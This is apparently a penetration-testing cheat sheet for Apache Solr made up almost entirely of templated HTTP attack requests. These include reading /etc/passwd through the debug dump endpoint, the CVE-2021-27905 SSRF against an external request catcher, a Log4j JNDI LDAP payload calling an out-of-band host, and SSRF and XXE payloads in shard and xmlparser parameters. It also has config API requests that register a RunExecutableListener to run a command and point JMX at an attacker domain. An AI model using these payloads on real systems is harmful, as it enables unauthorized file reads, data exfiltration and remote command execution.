# Apache Solr

## Search



## Exploit



### Apache Solr read file

```
GET /solr/admin/cores?wt=json HTTP/1.1
Host: {{Hostname}}
Accept-Language: en
Connection: close

GET /solr/{{core}}/debug/dump?stream.url=file:///etc/passwd&param=ContentStream HTTP/1.1
Host: {{Hostname}}
Accept-Language: en
Connection: close
```

### Apache Solr <= 8.8.1 SSRF & Arbitrary File Read (CVE-2021-27905)

```
GET /solr/admin/cores?wt=json HTTP/1.1
Host: {{Hostname}}
Accept-Language: en
Connection: close

GET /solr/%7Bcore%7D/replication/?command=fetchindex&masterUrl=https://bugbounty.requestcatcher.com/ssrf HTTP/1.1
Host: {{Hostname}}
Accept-Language: en
Connection: close
```

### Log4j (CVE-2021-44228) Detect for Apache Solr

```
{{BaseURL}}/solr/admin/collections?action=${jndi:ldap://{{interactsh-url}}}&wt=json
```



### SSRF

```
{{BaseURL}}/solr/db/replication?command=fetchindex&masterUrl=http://127.0.0.1&wt=json&httpBasicAuthUser=&httpBasicAuthPassword=
/search?q=Apple&shards=http://{{Host}}.{{Port}}.{{Subdomains}}.apachesolr.{{MY-DOMAIN}}/solr/collection/config%23&stream.body={"set-property":{"xxx":"yyy"}}
/solr/db/select?q=orange&shards=http://{{Host}}.{{Port}}.{{Subdomains}}.apachesolr.{{MY-DOMAIN}}/solr/atom&qt=/select?fl=id,name:author&wt=json
/solr/gettingstarted/select?q={!type=xmlparser v="<!DOCTYPE a SYSTEM 'http://{{Host}}.{{Port}}.{{Subdomains}}.apachesolr.{{MY-DOMAIN}}/solr'><a></a>"}
/solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://{{Host}}.{{Port}}.{{Subdomains}}.apachesolr.{{MY-DOMAIN}}/xxx"'><a></a>'

POST
POST /solr/db/config HTTP/1.1
Host: {{Subdomains}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: application/json

{"add-listener":{"event":"postCommit","name":"newlistener","class":"solr.RunExecutableListener","exe":"nslookup","dir":"/usr/bin/","args":["{{Host}}.{{Port}}.{{Subdomains}}.apachesolr.{{MY-DOMAIN}}"]}}

POST /solr/db/config HTTP/1.1
Host: {{Subdomains}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: application/json

{"set-property":{"jmx.serviceUrl":"service:jmx:rmi:///jndi/rmi://{{Host}}.{{Port}}.{{Subdomains}}.apachesolr.{{MY-DOMAIN}}/jmxrmi"}}

```
